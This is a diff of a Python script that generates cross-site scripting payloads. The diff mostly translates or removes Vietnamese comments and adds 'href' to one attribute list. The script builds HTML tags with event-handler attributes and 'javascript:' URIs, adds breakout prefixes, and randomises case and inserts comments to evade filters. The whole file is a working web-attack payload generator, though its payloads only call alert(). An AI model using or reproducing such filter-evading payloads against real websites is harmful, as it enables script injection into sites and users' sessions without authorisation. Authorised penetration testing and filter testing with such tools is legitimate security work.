@@ -1,7 +1,7 @@
 import random
 
 prefix = [r"'>\"", r'\">', r'<"', r'><', r'>"<', r'.\>"</.', r'./>%20<./', r'/>%20<', r'%20/%20>', r'%20">%20<', r'%3E%3C', r'Pjw=']
-# Danh sách các tag HTML phổ biến và thuộc tính phù hợp với từng tag
+# HTML Tags name
 tags_properties = {
     'img': ['src', 'onerror', 'alt'],
     'script': ['src', 'type'],
@@ -14,35 +14,32 @@ tags_properties = {
     'audio': ['src', 'autoplay', 'onplay']
 }
 
-# Danh sách các thuộc tính sự kiện có thể kích hoạt XSS
+# List attribute
 event_attributes = [
     'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onchange', 'onblur', 'onsubmit',
     'oninput', 'onkeydown', 'onkeyup', 'onpaste', 'onselect','ontoggle'
 ]
 
-# Danh sách các thuộc tính bổ sung có thể dùng
 additional_attributes = [
-     'on', 'only', 'autofocus', 'autoplay','popover'
+     'on', 'only', 'autofocus', 'autoplay','popover','href'
 ]
 
-# Danh sách các thuộc tính phụ (sub-attributes) có thể dùng
 sub_attributes = [
     'data-info', 'data-xss', 'data-custom', 'data-test'
 ]
 
 def random_uppercase(s):
-    """Chuyển một số chữ cái trong chuỗi thành chữ hoa ngẫu nhiên."""
+    """Convert lowercase to uppercase"""
     s_list = list(s)
-    indices = random.sample(range(len(s_list)), max(1, len(s_list) // 3))  # Chọn ngẫu nhiên các chỉ số để in hoa
+    indices = random.sample(range(len(s_list)), max(1, len(s_list) // 3)) 
     for index in indices:
         s_list[index] = s_list[index].upper()
     return ''.join(s_list)
 
 def add_obfuscation(payload):
     comments = ['/**/', '/*comment*/', '/*xss*/']
-    # Chèn comment ngẫu nhiên vào các vị trí khác nhau của payload
     obfuscated_payload = payload
-    for _ in range(random.randint(1, 3)):  # Chèn 1-3 comment vào payload
+    for _ in range(random.randint(1, 3)): 
         comment = random.choice(comments)
         position = random.randint(0, len(obfuscated_payload) - 1)
         obfuscated_payload = obfuscated_payload[:position] + comment + obfuscated_payload[position:]
@@ -61,9 +58,7 @@ def generate_payload():
     else:
         payload = f"<{tag} {additional_attr}='javascript:alert(3)' {event_attr}='alert(3)' {property_attr}='alert(1)' {sub_attr}='test' />"
 
-    # Áp dụng tính năng in hoa cho một số chữ cái trong payload
     payload = random_uppercase(payload)
-    # Thêm tính năng obfuscate bằng comment
     payload = add_obfuscation(payload)
     
     return payload
@@ -83,9 +78,7 @@ def generate_payload_bracket():
         else:
             payload = f"{pr}<{tag} {additional_attr}='javascript:alert(3)' {event_attr}='alert(3)' {property_attr}='alert(1)' {sub_attr}='test' />"
 
-        # Áp dụng tính năng in hoa cho một số chữ cái trong payload
         payload = random_uppercase(payload)
-        # Thêm tính năng obfuscate bằng comment
         payload = add_obfuscation(payload)
         
         return payload
